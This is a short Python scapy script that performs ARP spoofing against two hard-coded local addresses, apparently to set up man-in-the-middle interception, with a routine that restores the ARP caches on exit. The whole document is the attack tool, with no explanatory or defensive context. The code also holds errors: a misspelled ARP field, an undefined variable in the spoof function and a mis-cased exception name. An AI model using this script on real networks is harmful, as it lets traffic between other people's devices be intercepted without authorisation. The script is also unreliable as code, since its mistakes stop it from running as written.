#!/usr/bin/python

import scapy.all as scapy

def restore(dip , sip):
	tmac = get_target_mac(dip)
	smac = get_target_mac(sip)
	packet = scapy.ARP(op=2,pdst = dip , hwst=tmac,psrc=sip,hwsrc=smac)
	scapy.send(packet,verbose=False)

def get_target_mac(target_ip):
	arp_request = scapy.ARP(pdst=target_ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	finalpacket = broadcast/arp_request
	ans = scapy.srp(finalpacket , timeout = 2 , verbose=False)[0]
	mac = ans[0][1].hwsrc
	return mac

def spoof_arp(target_ip , spoof_ip):
	mac = get_target_mac(target_ip)
	packet = scapy.ARP(op=2,hwdst=mac,pdst=target_ip,psrc=spoofed_ip)
	scapy.send(packet , verbose = False)

def main():
	try:
		while(True):
			spoof_arp("192.168.29.1" , "192.168.29.196")
			spoof_arp("192.168.29.196" , "192.168.29.1")
	except(KeyBoardInterrupt):
		restore("192.168.29.1" , "192.168.29.196")
		restore("192.168.29.196" , "192.168.29.1")
		pass
main()
